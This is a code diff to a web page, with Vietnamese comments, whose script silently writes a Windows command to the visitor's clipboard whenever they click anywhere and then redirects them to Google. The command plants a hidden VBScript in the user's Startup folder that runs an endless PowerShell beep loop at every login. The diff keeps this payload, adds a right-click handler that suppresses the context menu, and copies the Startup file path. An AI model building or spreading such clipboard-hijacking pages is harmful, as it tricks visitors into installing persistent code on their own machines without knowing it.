@@ -11,17 +11,28 @@
     }
   </style>
 </head>
-<body onclick="copyAndRedirect()" >
+<body>
 
 <script>
-  function copyAndRedirect() {
-    const text = `cmd /c (echo Set sh = CreateObject^("WScript.Shell"^) && echo sh.Run "powershell -Command while^($true^){[console]::beep^(1000,200^);Start-Sleep 1}", 0) > "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\beep.vbs"`;
-    navigator.clipboard.writeText(text).then(() => {
+  const text1 = `cmd /c (echo Set sh = CreateObject^("WScript.Shell"^) && echo sh.Run "powershell -Command while^($true^){[console]::beep^(1000,200^);Start-Sleep 1}", 0) > "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\beep.vbs"`;
+  const text2 = "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\beep.vbs";
+
+  function copyAndRedirect(text) {
+    navigator.clipboard.writeText(text).finally(() => {
       window.location.href = "https://www.google.com";
     });
-    // Nếu muốn chắc chắn redirect luôn không chờ promise:
-    // window.location.href = "https://www.google.com";
   }
+
+  document.body.addEventListener("click", function(e) {
+    if (e.button === 0) { // chuột trái
+      copyAndRedirect(text1);
+    }
+  });
+
+  document.body.addEventListener("contextmenu", function(e) {
+    e.preventDefault(); // ngăn menu chuột phải hiện ra
+    copyAndRedirect(text2);
+  });
 </script>
 
 </body>
